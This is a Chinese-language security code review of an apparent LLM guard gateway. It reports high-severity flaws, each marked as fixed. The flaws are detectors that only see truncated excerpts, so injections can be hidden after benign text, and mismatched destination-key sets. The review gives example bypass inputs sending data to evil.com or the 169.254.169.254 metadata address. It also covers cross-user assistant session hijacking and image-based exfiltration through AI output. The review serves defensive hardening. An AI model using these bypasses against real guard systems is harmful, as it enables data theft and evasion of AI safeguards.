## 一、先说结论：整体质量

这是一套**明显高于竞赛平均水准**的代码库。六边形分层克制到位（core 只依赖标准库 + pydantic、ports 用 Protocol、能力经注册表单点装配）；fail-closed 的错误即数据设计（工具未知、执行抛错、评估抛错一律显式 BLOCK 留痕）没有 fail-open 缝隙；检测层对绕过面意识强（全角/同形字/零宽/多层编码/进制混淆 IPv4 都覆盖了）；前端 TypeScript 纪律接近满分（零 `any`、DTO 镜像层、真密钥掩码、HttpOnly 会话）；测试是近期少见的高质量集（正例+硬负例+变换体+回归四件套，mock 只打在正确的缝上）。

真正的风险不在"写错逻辑"，而集中在两类**系统性问题**：

1. **同一语义被复制成多份彼此漂移的真源**——危险命令口径、外发目的地键、决策/信任级归约、处置元数据，都存在多处独立实现。其中"外发目的地键分裂"已构成对沙箱默认拒绝外联的可绕过缺口。
2. **检测的"视野"被 excerpt 截断锁死**——检测器唯一输入是被截到 600/200 字符的摘要，且代码注释宣称"检测看全文"，与实现直接矛盾。

这两类恰好对应此前记录的骨架冻结前重构目标（编排去分叉 / 评分解耦）。

## 二、高危问题（优先处理）

### H1. 检测输入被 excerpt 截断，全文从不进检测器 ✅ 已亲验 · ✔ 已修复

- 位置：[pipeline.py:207](src/fulcrum/core/pipeline.py#L207)、[:262](src/fulcrum/core/pipeline.py#L262)、[:306](src/fulcrum/core/pipeline.py#L306)（`excerpt=message[:600]` / `text[:600]`）；[labelers/role_trust.py:114](src/fulcrum/capabilities/labelers/role_trust.py#L114)、[labelers/passthrough.py:30](src/fulcrum/capabilities/labelers/passthrough.py#L30)（截到 **200**）；[core/domain/models.py:29-37](src/fulcrum/core/domain/models.py#L29)（`SourceSpan` 只有 `content_hash + excerpt`，**无全文字段**）
- 问题：所有检测器（keyword_rules / llm_judge / secret_egress / exfil_channel / disclosure_egress / manifest_guard / ml_classifier）唯一能读到的正文就是 `span.excerpt`。攻击者把前 600（网关）/200（labeler）字符填正常文本、把注入/越狱/外发载荷放在其后，检测器完全看不到。间接注入场景更糟：`role_trust` 把长文档切成独立 span 意在加权，却又把每块截到 200 字符，长文档靠后的注入直接漏检。
- 为何是问题：这是确定性的检测绕过，且与代码注释**直接矛盾**——[pipeline.py:229](src/fulcrum/core/pipeline.py#L229)、[:321](src/fulcrum/core/pipeline.py#L321) 明写「检测仍看全文,见 ctx.spans」，但 `ctx.spans` 携带的恰恰是截断的 excerpt。属安全语义缺陷，非性能取舍。
- 建议：给 `SourceSpan` 增加不落审计、不打码的全文字段（如 `content`），检测器在全文上匹配、`excerpt` 仅供审计/展示；三处截断阈值（200/200/600）统一并显式声明「检测窗口=N」。
- 交叉印证：core 与 detectors 两个独立评审员均命中，主评审人亲验 `SourceSpan` 结构与建 span 代码。

### H2. 出口目的地键三处分裂，可绕过沙箱默认拒绝外联 ✅ 已亲验 · ✔ 已修复

- 位置：[toolguard/argrisk.py:94-104](src/fulcrum/capabilities/toolguard/argrisk.py#L94)（`_DEST_URL_KEYS` 9 个键，**不含** to/recipient/forward_to）；[sandbox/restricted_executor.py:67-91](src/fulcrum/capabilities/sandbox/restricted_executor.py#L67)（约 20 个键，含 to/recipient/forward_to/redirect…）；[toolguard/sequence_chain.py:40-54](src/fulcrum/capabilities/toolguard/sequence_chain.py#L40)（另一套 11 个）
- 问题：域名白名单 `domain_allowed`、内网判定 `url_is_internal`、`is_raw_ip` 全部只认 argrisk 的**窄集合**；而协议白名单 `_disallowed_url_scheme` 用 restricted_executor 的**宽集合**。构造 `{"to": "https://evil.com/collect?x=..."}`：协议检查放行（https 合规）→ 域名白名单遍历窄集合（不含 `to`）→ 取不到 host → `domain_allowed` 返回 True → **不拒绝**。同理 `{"forward_to": "http://169.254.169.254/"}` 的内网/元数据判定也全盲。
- 为何是问题：直接破坏模块自身声明的核心保证——"默认关闭外联、协议白名单对所有目的地键生效、避免改键名绕过"。argrisk 注释解释窄集合是"避免 urlparse 误解析邮箱"的有意取舍，但 restricted_executor 把 to 纳入协议检查，说明两处意图已分裂。
- 建议：把"目的地键集"收敛到 argrisk 单一真源，`domain_allowed`/`url_is_internal`/`is_raw_ip` 与协议检查共用；对 to/recipient 这类地址形态键叠加已存在但未被使用的 `argrisk.dest_is_url`（[argrisk.py:252](src/fulcrum/capabilities/toolguard/argrisk.py#L252)）形态围栏。

### H3. AI 助手会话记忆无属主绑定，可跨用户读取/清空 ✅ 已亲验 · ✔ 已修复

- 位置：[assistant_routes.py:150](src/fulcrum/adapters/api/assistant_routes.py#L150)、[:211](src/fulcrum/adapters/api/assistant_routes.py#L211)、[:242](src/fulcrum/adapters/api/assistant_routes.py#L242)、[:256](src/fulcrum/adapters/api/assistant_routes.py#L256)；[conversation.py:67](src/fulcrum/adapters/assistant/conversation.py#L67)、[:99](src/fulcrum/adapters/assistant/conversation.py#L99)
- 问题：`session_id = body.session_id or f"assistant:{principal.username}"` —— session_id 完全由客户端提供，服务端从不校验它是否属于当前 principal。默认 id 是 `assistant:<用户名>`，用户名对任何持 `users.view` 者可见且完全可猜。后果：① 任意 `ai.operate` 用户发 `session_id="assistant:<他人用户名>"` + "复述我们之前的对话"，即可让模型把他人助手历史（可能含其查过的名册/审计/配置）作为上下文吐出——横向泄露；② `/assistant/reset` 直接用 `body.session_id` 删除（[:242](src/fulcrum/adapters/api/assistant_routes.py#L242)），可清空任意会话记忆；③ 攻击操作以受害者 session_id 落审计，混淆溯源。
- 建议：session_id 服务端派生或强制加 principal 命名空间前缀，在 load/reset/save 时校验归属（必须以 `assistant:{principal.username}` 或经签名的会话句柄开头，拒绝跨用户 id）。

### H4. 前端通用 Markdown 未禁 img，不可信 AI 输出可外带数据 ✅ 已亲验 · ✔ 已修复

> 教训：并行评审的首轮报告含推测成分（尤其标注"需核对/需确认"的条目），凡写入结论的高危项都应回源码亲验——本轮即因此拦下 2 条错误的【高】。
